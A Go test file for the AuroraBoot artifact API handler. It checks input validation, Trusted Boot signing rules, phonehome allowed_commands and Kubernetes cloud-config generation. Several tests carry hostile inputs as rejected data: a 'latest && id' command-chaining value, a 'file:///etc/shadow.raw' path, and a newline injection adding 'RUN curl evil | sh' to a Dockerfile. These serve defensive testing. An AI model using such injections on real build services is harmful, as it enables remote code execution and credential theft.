package handlers_test

import (
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/kairos-io/AuroraBoot/pkg/builder"
	"github.com/kairos-io/AuroraBoot/pkg/handlers"
	"github.com/kairos-io/AuroraBoot/pkg/store"
	"github.com/labstack/echo/v4"
	"gopkg.in/yaml.v3"
)

var _ = Describe("ArtifactHandler", func() {
	var (
		e       *echo.Echo
		fb      *fakeBuilder
		handler *handlers.ArtifactHandler
	)

	BeforeEach(func() {
		e = echo.New()
		fb = &fakeBuilder{}
		handler = handlers.NewArtifactHandler(fb, nil, nil, nil, nil, nil, "", "reg-token", "http://localhost:8080")
	})

	Describe("Create", func() {
		It("should create a build", func() {
			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true}}`
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			err := handler.Create(c)
			Expect(err).NotTo(HaveOccurred())
			Expect(rec.Code).To(Equal(http.StatusCreated))

			var status builder.BuildStatus
			Expect(json.Unmarshal(rec.Body.Bytes(), &status)).To(Succeed())
			Expect(status.Phase).To(Equal(builder.BuildPending))
			Expect(status.ID).NotTo(BeEmpty())
		})

		It("returns 400 (not 500) when build inputs fail validation", func() {
			// The real builder rejects shell-metacharacter values like this
			// before any build starts and returns an ErrInvalidBuildOptions-wrapped
			// error; the handler must surface that as a client error.
			fb.buildErr = fmt.Errorf("%w: invalid kairos version %q", builder.ErrInvalidBuildOptions, "latest && id")

			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","kairosVersion":"latest && id","outputs":{"iso":true}}`
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			err := handler.Create(c)
			Expect(err).NotTo(HaveOccurred())
			Expect(rec.Code).To(Equal(http.StatusBadRequest))

			var resp map[string]string
			Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
			Expect(resp["error"]).To(ContainSubstring("invalid build options"))

			// The rejected request must not have been queued.
			Expect(fb.builds).To(BeEmpty())
		})

		It("forwards the selected catalog extensions and the catalog override to the builder", func() {
			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},` +
				`"extensions":["nvidia","tailscale@v1.2.3"],` +
				`"extensionsCatalogs":["https://example.test/releases.json"]}`
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			Expect(handler.Create(c)).To(Succeed())
			Expect(rec.Code).To(Equal(http.StatusCreated))
			Expect(fb.builds).To(HaveLen(1))
			Expect(fb.lastOpts.Extensions).To(Equal([]string{"nvidia", "tailscale@v1.2.3"}))
			Expect(fb.lastOpts.ExtensionsCatalogs).To(Equal([]string{"https://example.test/releases.json"}))
		})

		It("has the builder redact every secret it hands it from the build log", func() {
			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},` +
				`"provisioning":{"userMode":"custom","username":"ops","password":"node-password-123"}}`
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			Expect(handler.Create(c)).To(Succeed())
			Expect(rec.Code).To(Equal(http.StatusCreated))
			Expect(fb.lastOpts.UploadToken).NotTo(BeEmpty())
			Expect(fb.lastOpts.LogRedactValues).To(ContainElements("reg-token", "node-password-123", fb.lastOpts.UploadToken))
		})

		It("leaves the catalog list empty when the client sends none, so the default one is read", func() {
			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},"extensions":["nvidia"]}`
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			Expect(handler.Create(c)).To(Succeed())
			Expect(rec.Code).To(Equal(http.StatusCreated))
			Expect(fb.builds).To(HaveLen(1))
			Expect(fb.lastOpts.ExtensionsCatalogs).To(BeEmpty())
		})

		It("returns 400 for an extension name the catalog cannot be asked for", func() {
			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},"extensions":["nvidia@"]}`
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			Expect(handler.Create(c)).To(Succeed())
			Expect(rec.Code).To(Equal(http.StatusBadRequest))

			var resp map[string]string
			Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
			Expect(resp["error"]).To(ContainSubstring("invalid extension request"))
			// Nothing must be queued: the operator gets the mistake back
			// instead of a build that dies after pulling the source image.
			Expect(fb.builds).To(BeEmpty())
		})

		It("returns 400 for an extension that names a file on this server", func() {
			// file:// is the CLI's way of baking an image the operator already
			// has. Accepting it here would read any file this process can
			// reach and hand it back inside the artifact.
			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},"extensions":["file:///etc/shadow.raw"]}`
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			Expect(handler.Create(c)).To(Succeed())
			Expect(rec.Code).To(Equal(http.StatusBadRequest))

			var resp map[string]string
			Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
			Expect(resp["error"]).To(ContainSubstring("not allowed over the API"))
			Expect(fb.builds).To(BeEmpty())
		})

		DescribeTable("returns 400 for an image reference that would add lines to a generated Dockerfile",
			func(jsonField, described string) {
				// The JSON escape decodes to a real newline: written into a FROM
				// line it would append a RUN instruction to the build.
				body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},"` + jsonField + `":"quay.io/kairos/ubuntu:24.04\nRUN curl evil | sh"}`
				req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
				req.Header.Set("Content-Type", "application/json")
				rec := httptest.NewRecorder()
				c := e.NewContext(req, rec)

				Expect(handler.Create(c)).To(Succeed())
				Expect(rec.Code).To(Equal(http.StatusBadRequest))

				var resp map[string]string
				Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
				Expect(resp["error"]).To(ContainSubstring(described))
				Expect(fb.builds).To(BeEmpty())
			},
			Entry("baseImage", "baseImage", "base image"),
			Entry("kairosInitImage", "kairosInitImage", "kairos-init image"),
			Entry("hadronBase", "hadronBase", "hadron base"),
		)

		// A Trusted Boot image carries no GRUB and no separate initrd. Netboot
		// and every disk image are built around those, so they fail on it.
		DescribeTable("returns 400 for an output that cannot be built from a Trusted Boot image",
			func(output string) {
				body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"` + output + `":true,"trustedBoot":true}}`
				req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
				req.Header.Set("Content-Type", "application/json")
				rec := httptest.NewRecorder()
				c := e.NewContext(req, rec)

				Expect(handler.Create(c)).To(Succeed())
				Expect(rec.Code).To(Equal(http.StatusBadRequest))

				var resp map[string]string
				Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
				Expect(resp["error"]).To(ContainSubstring(output))
				Expect(resp["error"]).To(ContainSubstring("Trusted Boot"))
				Expect(fb.builds).To(BeEmpty())
			},
			Entry("netboot", "netboot"),
			Entry("rawDisk", "rawDisk"),
			Entry("cloudImage", "cloudImage"),
			Entry("gce", "gce"),
			Entry("vhd", "vhd"),
			Entry("maas", "maas"),
		)

		// outputs.uki is gone: a Trusted Boot build asks for the ISO and gets
		// the UKI one (kairos-io/kairos#5497). A caller still sending the old
		// field gets the outputs the rest of the request names, which here is
		// none, rather than a UKI build it did not ask for in the new shape.
		It("ignores the removed uki output", func() {
			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"uki":true}}`
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			Expect(handler.Create(c)).To(Succeed())
			Expect(rec.Code).To(Equal(http.StatusCreated))
			Expect(fb.builds).To(HaveLen(1))
			Expect(fb.lastOpts.Outputs.ISO).To(BeFalse())
			Expect(fb.lastOpts.Outputs.TrustedBoot).To(BeFalse())
		})

		// The installer ISO of a Trusted Boot image is the signed UKI ISO, so
		// asking for the ISO on such a build asks for that one.
		Describe("with a SecureBoot key set", func() {
			BeforeEach(func() {
				keys := &fakeSecureBootKeySetStore{keySets: []*store.SecureBootKeySet{
					{ID: "ks-1", Name: "prod-keys", KeysDir: "/keys/prod", TPMPCRKeyPath: "/keys/prod/tpm2-pcr-private.pem"},
					{ID: "ks-no-tpm", Name: "no-tpm", KeysDir: "/keys/no-tpm"},
				}}
				handler = handlers.NewArtifactHandler(fb, nil, nil, keys, nil, nil, "", "reg-token", "http://localhost:8080")
			})

			create := func(body string) *httptest.ResponseRecorder {
				req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
				req.Header.Set("Content-Type", "application/json")
				rec := httptest.NewRecorder()
				Expect(handler.Create(e.NewContext(req, rec))).To(Succeed())
				return rec
			}

			// The installer ISO of a Trusted Boot image is the signed UKI ISO,
			// so asking for the ISO on such a build asks for that one.
			It("builds the UKI ISO when a Trusted Boot build asks for the ISO", func() {
				rec := create(`{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true,"tar":true,"trustedBoot":true},"signing":{"ukiKeySetId":"ks-1"}}`)

				Expect(rec.Code).To(Equal(http.StatusCreated))
				Expect(fb.builds).To(HaveLen(1))
				// The request reaches the builder as it was written. The ISO
				// it names is the UKI one because the build is Trusted Boot,
				// which is what UKIISO reports, so no conversion happens here
				// and the stored record says iso rather than uki.
				Expect(fb.lastOpts.ISO).To(BeTrue())
				Expect(fb.lastOpts.Outputs.ISO).To(BeTrue())
				Expect(fb.lastOpts.Outputs.UKIISO()).To(BeTrue())
				Expect(fb.lastOpts.Outputs.Tar).To(BeTrue())
				Expect(fb.lastOpts.Outputs.TrustedBoot).To(BeTrue())
				Expect(fb.lastOpts.Signing.UKITPMPCRKey).To(Equal("/keys/prod/tpm2-pcr-private.pem"))
			})

			// The UKI step needs all three keys and would otherwise fail
			// minutes into the build, or fail to start on the operator backend.
			DescribeTable("returns 400 for a Trusted Boot ISO it cannot sign",
				func(signing string) {
					rec := create(`{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true,"trustedBoot":true}` + signing + `}`)

					Expect(rec.Code).To(Equal(http.StatusBadRequest))
					var resp map[string]string
					Expect(json.Unmarshal(rec.Body.Bytes(), &resp)).To(Succeed())
					Expect(resp["error"]).To(ContainSubstring("signing.ukiKeySetId"))
					Expect(fb.builds).To(BeEmpty())
				},
				Entry("without a key set", ""),
				Entry("with a key set that has no TPM PCR key", `,"signing":{"ukiKeySetId":"ks-no-tpm"}`),
			)
		})

		It("accepts every image field when each holds a valid reference", func() {
			body := `{"baseImage":"ubuntu:24.04","kairosInitImage":"quay.io/kairos/kairos-init:v0.5.0","hadronBase":"localhost:5000/kairos/hadron@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef","outputs":{"iso":true}}`
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			Expect(handler.Create(c)).To(Succeed())
			Expect(rec.Code).To(Equal(http.StatusCreated))
			// The reference reaches the builder as the user wrote it.
			Expect(fb.lastOpts.BaseImage).To(Equal("ubuntu:24.04"))
		})

		It("returns 500 for a genuine server failure", func() {
			fb.buildErr = fmt.Errorf("disk full")

			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true}}`
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			err := handler.Create(c)
			Expect(err).NotTo(HaveOccurred())
			Expect(rec.Code).To(Equal(http.StatusInternalServerError))
		})

		// The operator backend has already created an OSArtifact CR by the
		// time we reach store.Create. If persisting the row fails, we must
		// reap the phantom CR and report the failure to the caller;
		// swallowing the error silently would leave a live cluster resource
		// invisible to List/Get/Cancel/Delete.
		It("reaps the builder resource and returns 500 when store.Create fails", func() {
			as := &fakeArtifactStore{createErr: fmt.Errorf("db write refused")}
			handlerWithStore := handlers.NewArtifactHandler(fb, as, nil, nil, nil, nil, "", "reg-token", "http://localhost:8080")

			body := `{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true}}`
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			Expect(handlerWithStore.Create(c)).To(Succeed())
			Expect(rec.Code).To(Equal(http.StatusInternalServerError))
			// The build was queued (Build succeeded), and the handler
			// forwarded a Cancel to reap the phantom CR.
			Expect(fb.builds).To(HaveLen(1))
			Expect(fb.cancelledIDs).To(ContainElement(fb.builds[0].ID))
		})
	})

	// The allowed_commands block in the generated phonehome cloud-config is
	// AuroraBoot's only lever for gating destructive remote commands, so we
	// pin its behavior in integration tests through the public Create endpoint.
	Describe("Create — phonehome allowed_commands", func() {
		post := func(body string) {
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)
			Expect(handler.Create(c)).To(Succeed())
			Expect(rec.Code).To(Equal(http.StatusCreated))
		}

		It("substitutes safe defaults when allowedCommands is omitted", func() {
			post(`{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true}}`)
			Expect(fb.lastOpts.Provisioning.AllowedCommands).To(ConsistOf("upgrade", "upgrade-recovery", "reboot", "unregister"))
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("phonehome:"))
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("allowed_commands:"))
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("- upgrade"))
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("- reboot"))
		})

		It("passes through a custom allowedCommands list verbatim", func() {
			post(`{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},"provisioning":{"registerAuroraBoot":true,"allowedCommands":["exec","reboot"]}}`)
			Expect(fb.lastOpts.Provisioning.AllowedCommands).To(Equal([]string{"exec", "reboot"}))
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("- exec"))
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("- reboot"))
			// The destructive command the user did NOT pick must not leak in.
			Expect(fb.lastOpts.CloudConfig).NotTo(ContainSubstring("- reset"))
		})

		It("emits an empty list when the operator opts into observe-only", func() {
			post(`{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},"provisioning":{"registerAuroraBoot":true,"allowedCommands":[]}}`)
			Expect(fb.lastOpts.Provisioning.AllowedCommands).To(HaveLen(0))
			Expect(fb.lastOpts.Provisioning.AllowedCommands).NotTo(BeNil())
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("allowed_commands: []"))
		})

		It("writes the target group's ID into the phonehome config", func() {
			gs := &fakeGroupStore{groups: []*store.NodeGroup{{ID: "grp-1", Name: "edge"}}}
			handler = handlers.NewArtifactHandler(fb, nil, gs, nil, nil, nil, "", "reg-token", "http://localhost:8080")

			post(`{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},"provisioning":{"registerAuroraBoot":true,"targetGroupId":"grp-1"}}`)

			var doc struct {
				Phonehome struct {
					Group string `yaml:"group"`
				} `yaml:"phonehome"`
			}
			Expect(yaml.Unmarshal([]byte(fb.lastOpts.CloudConfig), &doc)).To(Succeed())
			Expect(doc.Phonehome.Group).To(Equal("grp-1"))
		})

		It("omits the phonehome stanza entirely when registerAuroraBoot is false", func() {
			post(`{"baseImage":"quay.io/kairos/ubuntu:24.04","outputs":{"iso":true},"provisioning":{"registerAuroraBoot":false}}`)
			Expect(fb.lastOpts.CloudConfig).NotTo(ContainSubstring("phonehome:"))
			Expect(fb.lastOpts.CloudConfig).NotTo(ContainSubstring("allowed_commands"))
		})
	})

	Describe("Create — kubernetes provider cloud-config", func() {
		createWith := func(h *handlers.ArtifactHandler, body string) {
			req := httptest.NewRequest(http.MethodPost, "/api/v1/artifacts", strings.NewReader(body))
			req.Header.Set("Content-Type", "application/json")
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)
			Expect(h.Create(c)).To(Succeed())
			Expect(rec.Code).To(Equal(http.StatusCreated))
		}
		post := func(body string) { createWith(handler, body) }

		It("enables k3s in cloud-config for the standard variant", func() {
			post(`{"baseImage":"ubuntu:24.04","variant":"standard","kubernetesDistro":"k3s","outputs":{"iso":true}}`)
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("k3s:"))
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("enabled: true"))
		})

		It("enables k0s in cloud-config for the standard variant", func() {
			post(`{"baseImage":"ubuntu:24.04","variant":"standard","kubernetesDistro":"k0s","outputs":{"iso":true}}`)
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("k0s:"))
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("enabled: true"))
		})

		It("disables k3s in cloud-config when kubernetesEnabled is false", func() {
			post(`{"baseImage":"ubuntu:24.04","variant":"standard","kubernetesDistro":"k3s","kubernetesEnabled":false,"outputs":{"iso":true}}`)
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("k3s:"))
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("enabled: false"))
		})

		It("defaults kubernetesEnabled to true when omitted", func() {
			post(`{"baseImage":"ubuntu:24.04","variant":"standard","kubernetesDistro":"k3s","outputs":{"iso":true}}`)
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("enabled: true"))
		})

		It("omits kubernetes provider stanzas for the core variant", func() {
			post(`{"baseImage":"ubuntu:24.04","variant":"core","kubernetesDistro":"k3s","outputs":{"iso":true}}`)
			Expect(fb.lastOpts.CloudConfig).NotTo(ContainSubstring("k3s:"))
			Expect(fb.lastOpts.CloudConfig).NotTo(ContainSubstring("k0s:"))
		})

		It("stores kubernetes as disabled for the core variant", func() {
			// The UI omits kubernetesEnabled entirely for a non-standard
			// variant, so the record must not fall back to the enabled
			// default and contradict variant=core (kairos-io/kairos#4354).
			as := &fakeArtifactStore{}
			h := handlers.NewArtifactHandler(fb, as, nil, nil, nil, nil, "", "reg-token", "http://localhost:8080")
			createWith(h, `{"baseImage":"ubuntu:24.04","variant":"core","outputs":{"iso":true}}`)

			Expect(fb.lastOpts.Provisioning.KubernetesEnabled).To(BeFalse())
			Expect(as.records).To(HaveLen(1))
			Expect(as.records[0].KubernetesEnabled).NotTo(BeNil())
			Expect(*as.records[0].KubernetesEnabled).To(BeFalse())
		})

		It("stores kubernetes as disabled for the core variant even when the client asks for it", func() {
			as := &fakeArtifactStore{}
			h := handlers.NewArtifactHandler(fb, as, nil, nil, nil, nil, "", "reg-token", "http://localhost:8080")
			createWith(h, `{"baseImage":"ubuntu:24.04","variant":"core","kubernetesEnabled":true,"outputs":{"iso":true}}`)

			Expect(fb.lastOpts.Provisioning.KubernetesEnabled).To(BeFalse())
			Expect(as.records).To(HaveLen(1))
			Expect(as.records[0].KubernetesEnabled).NotTo(BeNil())
			Expect(*as.records[0].KubernetesEnabled).To(BeFalse())
		})

		It("stores kubernetes as enabled for the standard variant when omitted", func() {
			as := &fakeArtifactStore{}
			h := handlers.NewArtifactHandler(fb, as, nil, nil, nil, nil, "", "reg-token", "http://localhost:8080")
			createWith(h, `{"baseImage":"ubuntu:24.04","variant":"standard","kubernetesDistro":"k3s","outputs":{"iso":true}}`)

			Expect(fb.lastOpts.Provisioning.KubernetesEnabled).To(BeTrue())
			Expect(as.records).To(HaveLen(1))
			Expect(as.records[0].KubernetesEnabled).NotTo(BeNil())
			Expect(*as.records[0].KubernetesEnabled).To(BeTrue())
		})

		It("honours an explicit opt-out on the standard variant", func() {
			as := &fakeArtifactStore{}
			h := handlers.NewArtifactHandler(fb, as, nil, nil, nil, nil, "", "reg-token", "http://localhost:8080")
			createWith(h, `{"baseImage":"ubuntu:24.04","variant":"standard","kubernetesDistro":"k3s","kubernetesEnabled":false,"outputs":{"iso":true}}`)

			Expect(fb.lastOpts.Provisioning.KubernetesEnabled).To(BeFalse())
			Expect(as.records).To(HaveLen(1))
			Expect(as.records[0].KubernetesEnabled).NotTo(BeNil())
			Expect(*as.records[0].KubernetesEnabled).To(BeFalse())
		})

		It("merges extra k3s YAML without duplicating the top-level key", func() {
			post(`{"baseImage":"ubuntu:24.04","variant":"standard","kubernetesDistro":"k3s","outputs":{"iso":true},"cloudConfig":"k3s:\n  enabled: true\n  cluster-cidr: 10.42.0.0/16"}`)
			Expect(strings.Count(fb.lastOpts.CloudConfig, "k3s:")).To(Equal(1))
			Expect(fb.lastOpts.CloudConfig).To(ContainSubstring("cluster-cidr"))
		})
	})

	Describe("List", func() {
		It("should list all builds", func() {
			fb.builds = []*builder.BuildStatus{
				{ID: "build-1", Phase: builder.BuildReady},
			}
			req := httptest.NewRequest(http.MethodGet, "/api/v1/artifacts", nil)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			err := handler.List(c)
			Expect(err).NotTo(HaveOccurred())
			Expect(rec.Code).To(Equal(http.StatusOK))

			var statuses []*builder.BuildStatus
			Expect(json.Unmarshal(rec.Body.Bytes(), &statuses)).To(Succeed())
			Expect(statuses).To(HaveLen(1))
		})

		It("should return empty list when no builds exist", func() {
			req := httptest.NewRequest(http.MethodGet, "/api/v1/artifacts", nil)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			err := handler.List(c)
			Expect(err).NotTo(HaveOccurred())
			Expect(rec.Code).To(Equal(http.StatusOK))

			var statuses []*builder.BuildStatus
			Expect(json.Unmarshal(rec.Body.Bytes(), &statuses)).To(Succeed())
			Expect(statuses).To(HaveLen(0))
		})
	})

	Describe("DELETE /artifacts/:id", func() {
		var (
			as               *fakeArtifactStore
			handlerWithStore *handlers.ArtifactHandler
		)

		BeforeEach(func() {
			as = &fakeArtifactStore{
				records: []*store.ArtifactRecord{
					{ID: "art-1", Phase: store.ArtifactReady, BaseImage: "img1"},
				},
			}
			handlerWithStore = handlers.NewArtifactHandler(fb, as, nil, nil, nil, nil, "", "reg-token", "http://localhost:8080")
		})

		It("should delete the artifact and return 204", func() {
			req := httptest.NewRequest(http.MethodDelete, "/api/v1/artifacts/art-1", nil)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)
			c.SetParamNames("id")
			c.SetParamValues("art-1")

			err := handlerWithStore.Delete(c)
			Expect(err).NotTo(HaveOccurred())
			Expect(rec.Code).To(Equal(http.StatusNoContent))

			// Verify artifact is gone.
			_, lookupErr := as.GetByID(nil, "art-1")
			Expect(lookupErr).To(HaveOccurred())
		})

		It("should return 404 for non-existent artifact", func() {
			req := httptest.NewRequest(http.MethodDelete, "/api/v1/artifacts/nonexistent", nil)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)
			c.SetParamNames("id")
			c.SetParamValues("nonexistent")

			err := handlerWithStore.Delete(c)
			Expect(err).NotTo(HaveOccurred())
			Expect(rec.Code).To(Equal(http.StatusNotFound))
		})

		// Terminal-phase artifacts (Ready or Error) still keep backend state
		// alive when the builder is the operator backend (OSArtifact CR plus
		// its PVC). Delete must forward the cancellation regardless of phase
		// so the operator can reclaim the CR and its owned resources; the
		// call is best-effort so an error does not block the local cleanup.
		It("forwards Cancel to the builder for a Ready record so operator CRs get reaped", func() {
			req := httptest.NewRequest(http.MethodDelete, "/api/v1/artifacts/art-1", nil)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)
			c.SetParamNames("id")
			c.SetParamValues("art-1")

			Expect(handlerWithStore.Delete(c)).To(Succeed())
			Expect(rec.Code).To(Equal(http.StatusNoContent))
			Expect(fb.cancelledIDs).To(ContainElement("art-1"))
		})
	})

	Describe("DELETE /artifacts/failed (ClearFailed)", func() {
		var (
			as               *fakeArtifactStore
			handlerWithStore *handlers.ArtifactHandler
		)

		BeforeEach(func() {
			as = &fakeArtifactStore{
				records: []*store.ArtifactRecord{
					{ID: "art-ok", Phase: store.ArtifactReady, BaseImage: "img1"},
					{ID: "art-err1", Phase: store.ArtifactError, BaseImage: "img2"},
					{ID: "art-err2", Phase: store.ArtifactError, BaseImage: "img3"},
				},
			}
			handlerWithStore = handlers.NewArtifactHandler(fb, as, nil, nil, nil, nil, "", "reg-token", "http://localhost:8080")
		})

		It("should delete all Error-phase artifacts and return 204", func() {
			req := httptest.NewRequest(http.MethodDelete, "/api/v1/artifacts/failed", nil)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			err := handlerWithStore.ClearFailed(c)
			Expect(err).NotTo(HaveOccurred())
			Expect(rec.Code).To(Equal(http.StatusNoContent))

			remaining, _ := as.List(nil)
			Expect(remaining).To(HaveLen(1))
			Expect(remaining[0].ID).To(Equal("art-ok"))
		})

		// The operator backend produces terminal-phase OSArtifact CRs that
		// only go away when we tell the operator to release them. ClearFailed
		// must forward a cancellation for every failed record it drops so
		// the CR (and its PVC) leaves the cluster along with the DB row.
		It("calls builder.Cancel for each failed record so operator CRs get reaped", func() {
			req := httptest.NewRequest(http.MethodDelete, "/api/v1/artifacts/failed", nil)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)

			Expect(handlerWithStore.ClearFailed(c)).To(Succeed())
			Expect(rec.Code).To(Equal(http.StatusNoContent))
			Expect(fb.cancelledIDs).To(ConsistOf("art-err1", "art-err2"))
		})
	})

	Describe("Get", func() {
		It("should return a build by ID", func() {
			fb.builds = []*builder.BuildStatus{
				{ID: "build-1", Phase: builder.BuildReady},
			}
			req := httptest.NewRequest(http.MethodGet, "/api/v1/artifacts/build-1", nil)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)
			c.SetParamNames("id")
			c.SetParamValues("build-1")

			err := handler.Get(c)
			Expect(err).NotTo(HaveOccurred())
			Expect(rec.Code).To(Equal(http.StatusOK))
		})

		It("should return 404 for missing build", func() {
			req := httptest.NewRequest(http.MethodGet, "/api/v1/artifacts/missing", nil)
			rec := httptest.NewRecorder()
			c := e.NewContext(req, rec)
			c.SetParamNames("id")
			c.SetParamValues("missing")

			err := handler.Get(c)
			Expect(err).NotTo(HaveOccurred())
			Expect(rec.Code).To(Equal(http.StatusNotFound))
		})
	})
})
